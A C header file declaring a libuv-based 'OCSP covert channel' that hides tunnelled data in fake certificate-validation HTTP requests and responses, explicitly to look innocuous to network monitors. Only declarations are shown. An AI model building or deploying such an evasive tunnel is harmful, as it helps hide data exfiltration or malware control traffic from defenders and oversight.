#pragma once
#include <stdint.h>
#include <stddef.h>
#include <uv.h>
#include "util.h"

/*
 * OCSP covert channel.
 * Tunnels data over OCSP-like HTTP GET requests.
 * Client encodes data in the URL path; server returns data in
 * X-Tunnel-Data response header.
 * Traffic looks like certificate validation to network monitors.
 */

typedef struct ocsp_channel_s ocsp_channel_t;
typedef void (*ocsp_recv_cb_t)(const uint8_t *data, size_t len, void *userdata);
/* 1=connected, 0=disconnected */
typedef void (*ocsp_conn_cb_t)(int connected, void *userdata);

struct ocsp_channel_s {
    uv_loop_t     *loop;
    uv_tcp_t       tcp;
    uv_connect_t   connect_req;
    char           host[256];
    uint16_t       port;
    char           domain[256];
    ocsp_recv_cb_t on_recv;
    ocsp_conn_cb_t on_conn;
    void          *userdata;
    int            connected;
    uint8_t        recv_buf[8192];
    size_t         recv_len;
    uint32_t       req_seq;
    uint8_t        send_buf[4096];
    size_t         send_len;
    uv_write_t     write_req;
};

err_t ocsp_channel_init(ocsp_channel_t *ch, uv_loop_t *loop,
                        const char *host, uint16_t port,
                        const char *domain);
err_t ocsp_channel_connect(ocsp_channel_t *ch);
/* Send data encoded as HTTP GET /ocsp/{base36_data}
 * Response carries downstream data in X-Tunnel-Data header (hex) */
err_t ocsp_channel_send(ocsp_channel_t *ch,
                        const uint8_t *data, size_t len);
void  ocsp_channel_free(ocsp_channel_t *ch);
